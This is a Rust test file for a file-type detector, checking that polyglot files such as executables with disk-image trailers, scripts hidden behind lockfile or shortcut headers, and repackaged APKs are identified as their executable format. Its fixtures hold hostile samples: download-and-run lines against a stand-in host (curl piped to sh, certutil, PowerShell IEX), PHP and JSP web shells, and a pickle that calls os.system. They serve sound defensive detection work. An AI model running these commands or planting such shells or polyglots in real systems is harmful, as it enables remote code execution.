//! Files that are two formats at once are identified as the one that runs.

use super::*;

/// A PE image: `MZ`, `e_lfanew` at 0x40, a `PE\0\0` header and a COFF
/// machine, padded to `len` bytes.
fn pe(len: usize) -> Vec<u8> {
    let mut d = vec![0u8; len];
    d[..4].copy_from_slice(b"MZ\x90\x00");
    d[0x3c..0x40].copy_from_slice(&0x40u32.to_le_bytes());
    d[0x40..0x44].copy_from_slice(b"PE\0\0");
    d[0x44..0x46].copy_from_slice(&0x14cu16.to_le_bytes());
    d
}

/// A 512-byte UDIF `koly` trailer, version 4.
fn koly() -> Vec<u8> {
    let mut t = vec![0u8; 512];
    t[..4].copy_from_slice(b"koly");
    t[4..8].copy_from_slice(&4u32.to_be_bytes());
    t[8..12].copy_from_slice(&512u32.to_be_bytes());
    t
}

/// A valid fixed-disk VHD footer for an image of `size` bytes.
fn vhd_footer(size: u64) -> Vec<u8> {
    let mut f = vec![0u8; 512];
    f[..8].copy_from_slice(b"conectix");
    f[12..16].copy_from_slice(&0x0001_0000u32.to_be_bytes());
    f[16..24].copy_from_slice(&u64::MAX.to_be_bytes());
    f[48..56].copy_from_slice(&size.to_be_bytes());
    f[60..64].copy_from_slice(&2u32.to_be_bytes());
    let sum = !f.iter().map(|&b| u32::from(b)).sum::<u32>();
    f[64..68].copy_from_slice(&sum.to_be_bytes());
    f
}

fn file_type(path: &str, data: &[u8]) -> Option<FileType> {
    detect(Path::new(path), data).map(|d| d.file_type)
}

#[test]
fn pe_with_ftyp_in_its_dos_header_is_a_pe() {
    // Bytes 4..8 of the DOS header are ignored by the Windows loader.
    let mut data = pe(0x200);
    data[4..8].copy_from_slice(b"ftyp");
    assert_eq!(file_type("setup.exe", &data), Some(FileType::Pe));
    assert_eq!(file_type("", &data), Some(FileType::Pe));
}

#[test]
fn executable_with_appended_dmg_trailer_is_the_executable() {
    let mut data = pe(0x200);
    data.extend_from_slice(&koly());
    assert_eq!(file_type("payload.bin", &data), Some(FileType::Pe));

    let mut elf = b"\x7fELF\x02\x01\x01\x00".to_vec();
    elf.resize(1024, 0);
    elf.extend_from_slice(&koly());
    assert_eq!(file_type("payload", &elf), Some(FileType::Elf));

    let mut script = b"#!/bin/sh\ncurl -s http://x.test/a | sh\nexit 0\n".to_vec();
    script.extend_from_slice(&koly());
    assert_eq!(file_type("install", &script), Some(FileType::Shell));
}

#[test]
fn pe_with_appended_vhd_footer_is_a_pe() {
    let mut data = pe(0x400);
    data.extend_from_slice(&vhd_footer(0x400));
    assert_eq!(file_type("disk.bin", &data), Some(FileType::Pe));
}

#[test]
fn real_dmg_and_vhd_trailers_still_identify() {
    let mut dmg = vec![0x78, 0xDA, 0x01, 0x02, 0x00, 0x03];
    dmg.resize(4096, 0);
    dmg.extend_from_slice(&koly());
    assert_eq!(file_type("image.dmg", &dmg), Some(FileType::Dmg));

    let mut vhd = vec![0u8; 0x400];
    vhd.extend_from_slice(&vhd_footer(0x400));
    assert_eq!(file_type("disk.vhd", &vhd), Some(FileType::Vhd));
}

#[test]
fn iso_image_behind_an_executable_head_stays_an_image() {
    // A type-1 AppImage is an ELF runtime at the head of an ISO 9660 image
    // that holds the application.
    let mut data = b"\x7fELF\x02\x01\x01\x00".to_vec();
    data.resize(0x9000, 0);
    data[0x8001..0x8006].copy_from_slice(b"CD001");
    assert_eq!(file_type("app.AppImage", &data), Some(FileType::Iso));
}

#[test]
fn lockfile_header_behind_a_shebang_is_the_script() {
    let data = b"#!/bin/sh\n# yarn lockfile v1\ncurl -s http://x.test/a | sh\n";
    assert_eq!(file_type("install", data), Some(FileType::Shell));
}

#[test]
fn text_signature_under_a_language_name_is_the_language() {
    // cmd.exe, sh and PowerShell report the foreign first line as an error
    // and run the rest.
    let shortcut = b"[InternetShortcut]\r\n@echo off\r\ncertutil -urlcache -f http://x.test/a.exe a.exe\r\nstart a.exe\r\n";
    assert_eq!(file_type("run.bat", shortcut), Some(FileType::Batch));
    let lock = b"# yarn lockfile v1\nimport os\nos.system('curl -s http://x.test | sh')\n";
    assert_eq!(file_type("setup.py", lock), Some(FileType::Python));
    let cargo = b"# This file is automatically @generated by Cargo.\ncurl -s http://x.test | sh\n";
    assert_eq!(file_type("build.sh", cargo), Some(FileType::Shell));
    let pnpm = b"lockfileVersion: 5.4\ncurl -s http://x.test | sh\n";
    assert_eq!(file_type("build.sh", pnpm), Some(FileType::Shell));
    let postscript =
        b"%!PS\n$ErrorActionPreference = 'SilentlyContinue'\nIEX (New-Object Net.WebClient).DownloadString('http://x.test')\n";
    assert_eq!(file_type("run.ps1", postscript), Some(FileType::PowerShell));
    let mut go_mod = b"module x\n".to_vec();
    for _ in 0..900 {
        go_mod.extend_from_slice(b"go 1\n");
    }
    go_mod.extend_from_slice(b"curl -s http://x.test | sh\n");
    assert_eq!(file_type("build.sh", &go_mod), Some(FileType::Shell));
    assert_ne!(file_type("", &go_mod), Some(FileType::GoMod));
    // cmd.exe reports `require (` and runs the lines the open block holds.
    let open_block = b"module x\r\nrequire (\r\n@echo off\r\ncertutil -urlcache -f http://x.test/a.exe a.exe\r\nstart a.exe\r\n";
    assert_eq!(file_type("run.bat", open_block), Some(FileType::Batch));
}

#[test]
fn text_signatures_still_identify_under_their_own_names() {
    let shortcut = b"[InternetShortcut]\r\nURL=https://example.test/\r\n";
    assert_eq!(file_type("site.url", shortcut), Some(FileType::Text));
    assert_eq!(file_type("abc123", shortcut), Some(FileType::Text));
    let yarn = b"# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.\n# yarn lockfile v1\n\n\nabbrev@1:\n  version \"1.1.1\"\n";
    assert_eq!(
        file_type("yarn.abc123.lock", yarn),
        Some(FileType::YarnLock)
    );
    assert_eq!(file_type("abc123", yarn), Some(FileType::YarnLock));
    let ps = b"%!PS-Adobe-3.0\n%%Pages: 1\nshowpage\n";
    assert_eq!(file_type("doc.ps", ps), Some(FileType::PostScript));
    assert_eq!(file_type("doc", ps), Some(FileType::PostScript));
}

#[test]
fn server_page_opening_with_markup_is_the_server_page() {
    let page = b"<!DOCTYPE html>\n<html><body>\n<?php system($_GET['c']); ?>\n</body></html>\n";
    assert_eq!(file_type("shell.php", page), Some(FileType::Php));
    let xml = b"<?xml version=\"1.0\"?>\n<rss version=\"2.0\"><?php system($_GET['c']); ?></rss>\n";
    assert_eq!(file_type("feed.php", xml), Some(FileType::Php));
    let jspx = b"<?xml version=\"1.0\"?>\n<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\"><jsp:scriptlet>Runtime.getRuntime().exec(request.getParameter(\"c\"));</jsp:scriptlet></jsp:root>\n";
    assert_eq!(file_type("cmd.jsp", jspx), Some(FileType::Jsp));
    // The same page under an HTML name is a page.
    assert_eq!(file_type("index.html", page), Some(FileType::Html));
}

#[test]
fn batch_file_opening_with_markup_is_batch() {
    let page = b"<!DOCTYPE html>\r\n@echo off\r\ncertutil -urlcache -f http://x.test/a.exe %TEMP%\\a.exe\r\nstart %TEMP%\\a.exe\r\nexit /b\r\n";
    assert_eq!(file_type("run.bat", page), Some(FileType::Batch));
    let xml = b"<?xml version=\"1.0\"?>\r\n@echo off\r\nset X=%TEMP%\\a.exe\r\nif exist %X% del %X%\r\nstart %X%\r\n";
    assert_eq!(file_type("run.cmd", xml), Some(FileType::Batch));
    // A page under its own name stays a page.
    assert_eq!(file_type("run.html", page), Some(FileType::Html));
}

/// `zip` with one junk byte between its first and second local entries, the
/// central directory's offsets moved to match: every member is still where
/// the directory says, but the local-header chain breaks after the first.
fn zip_with_broken_chain(members: &[(&str, &[u8])]) -> Vec<u8> {
    let mut data = crate::fileid::testutil::zip_with(members, zip::CompressionMethod::Stored);
    let (first_name, first_body) = members[0];
    let gap = 30 + first_name.len() + first_body.len();
    assert_eq!(&data[gap..gap + 4], b"PK\x03\x04");
    data.insert(gap, 0);
    let u32_at = |d: &[u8], at: usize| u32::from_le_bytes(d[at..at + 4].try_into().unwrap());
    let eocd = data.len() - 22;
    assert_eq!(&data[eocd..eocd + 4], b"PK\x05\x06");
    let cd = u32_at(&data, eocd + 16) + 1;
    data[eocd + 16..eocd + 20].copy_from_slice(&cd.to_le_bytes());
    let mut at = cd as usize;
    while data[at..at + 4] == *b"PK\x01\x02" {
        let field = |i: usize| usize::from(u16::from_le_bytes([data[at + i], data[at + i + 1]]));
        let next = at + 46 + field(28) + field(30) + field(32);
        let offset = u32_at(&data, at + 42);
        if offset > 0 {
            data[at + 42..at + 46].copy_from_slice(&(offset + 1).to_le_bytes());
        }
        at = next;
    }
    data
}

#[test]
fn package_named_in_the_central_directory_is_that_package() {
    // Android reads the central directory; the local-header chain stops at
    // the gap, after an OpenDocument `mimetype`.
    let apk = zip_with_broken_chain(&[
        ("mimetype", b"application/vnd.oasis.opendocument.text"),
        ("AndroidManifest.xml", b"\x03\x00\x08\x00manifest"),
        ("classes.dex", b"dex\n035\0"),
    ]);
    assert_eq!(file_type("app.apk", &apk), Some(FileType::ApkAndroid));
    assert_eq!(file_type("", &apk), Some(FileType::ApkAndroid));
    // The same document with an unbroken chain is still a document.
    let odt = crate::fileid::testutil::zip_with(
        &[
            ("mimetype", b"application/vnd.oasis.opendocument.text"),
            ("content.xml", b"<office:document-content/>"),
        ],
        zip::CompressionMethod::Stored,
    );
    assert_eq!(file_type("doc.odt", &odt), Some(FileType::Odf));
}

#[test]
fn pe_whose_dos_header_reads_as_text_is_a_pe() {
    // The loader reads `e_magic` and `e_lfanew` and nothing else of the DOS
    // header, so all of it can be printable; the smallest such `e_lfanew`,
    // four tabs, puts the PE header 151 MB in.
    let lfanew = 0x0909_0909usize;
    let mut data = vec![b'\n'; lfanew + 0x100];
    data[..0x3c].copy_from_slice(&[b"MZ".as_slice(), &[b'A'; 0x3a]].concat());
    data[0x3c..0x40].copy_from_slice(&[0x09; 4]);
    data[lfanew..lfanew + 4].copy_from_slice(b"PE\0\0");
    data[lfanew + 4..lfanew + 6].copy_from_slice(&0x14cu16.to_le_bytes());
    assert_eq!(file_type("setup.exe", &data), Some(FileType::Pe));
    assert_eq!(file_type("", &data), Some(FileType::Pe));
    // The same text without the PE header is not a program.
    data[lfanew..lfanew + 4].copy_from_slice(b"\n\n\n\n");
    assert_ne!(file_type("", &data), Some(FileType::Pe));
}

#[test]
fn legacy_pickle_under_a_checkpoint_name_is_a_pickle() {
    // `pickle.dumps(obj, protocol=2)` of a `__reduce__` to `os.system`.
    let pickle = b"\x80\x02cposix\nsystem\nq\x00X\x02\x00\x00\x00idq\x01\x85q\x02Rq\x03.";
    for name in ["model.ckpt", "model.sav", "model.p", "model.pkl"] {
        assert_eq!(file_type(name, pickle), Some(FileType::Pickle), "{name}");
    }
}
